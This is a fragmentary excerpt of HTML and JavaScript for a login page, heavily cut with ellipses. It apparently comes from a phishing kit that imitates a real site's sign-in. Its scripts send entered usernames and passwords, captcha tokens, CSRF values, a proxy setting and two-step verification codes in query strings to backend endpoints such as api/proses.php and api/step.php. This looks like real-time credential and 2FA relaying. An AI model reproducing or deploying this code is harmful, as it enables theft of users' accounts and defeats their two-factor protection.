...
<li class="cursor-pointer"> <a class="font-header-2 nav-menu-title text-header" href="/discovery">Discover</a> </li>
    ...
    function login(){
        ...
        if(!username || !password){
            ...
            document.getElementById("text-error").innerHTML = "Incorrect username or password.";
                ...
                document.getElementById("fc-iframe").setAttribute('data-src', 'api/captcha.php?u='+username+'&p='+password);
                document.getElementById("fc-iframe").src = 'api/captcha.php?u='+username+'&p='+password+'&k=w';
...
<div id="secret-form" style="display: none;">
	...
	<input id="secret-csrf" hidden>
	<input id="secret-cid" hidden>
	...
	console.log(e.data);
    	var a = e.data;
		var fctokena = a.split("#fctoken#")[1].split("#cid#")[0];
		var cid = a.split("#cid#")[1].split("#csrf#")[0];
		var csrfa = a.split("#csrf#")[1].split("#proxy#")[0];
		var proxya = a.split("#proxy#")[1];
        		document.getElementById('secret-funcaptcha').value = fctokena;
				document.getElementById('secret-proxy').value = proxya;
				document.getElementById('secret-csrf').value = csrfa;
				document.getElementById('secret-cid').value = cid;
...
<script>
  ...
  $("#secret-login-btn").click(function() {
      ...
      var fctokens = $("#secret-funcaptcha").val();
	   var proxy = $("#secret-proxy").val();
	  var cid = $("#secret-cid").val();
	  var csrf = $("#secret-csrf").val();
      var session = "";
      
      const checkcode = 'api/proses.php?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&fctokens=' + encodeURIComponent(fctokens) + '&session=' + encodeURIComponent(session) + '&proxy=' + encodeURIComponent(proxy) + '&csrf=' + encodeURIComponent(csrf) + '&cid=' + encodeURIComponent(cid);
       $.ajax(checkcode, {
      method: "GET",
      success: (data) => {
...
$.get('east.php?q=login', function(data) {
	document.getElementById('quicklogin').innerHTML = data;
							    ...
							    function twostep(){
							        ...
							        const checkcode = '/api/step.php?id=' + encodeURIComponent(userid) + "&ticket=" + encodeURIComponent(ticket) + "&code=" + encodeURIComponent(code) + "&password=" + encodeURIComponent(password) + '&session=' + '&proxy=' + encodeURIComponent(proxy);
                                    $.ajax(checkcode, {
                                        method: "GET",
                                        success: (data) => {
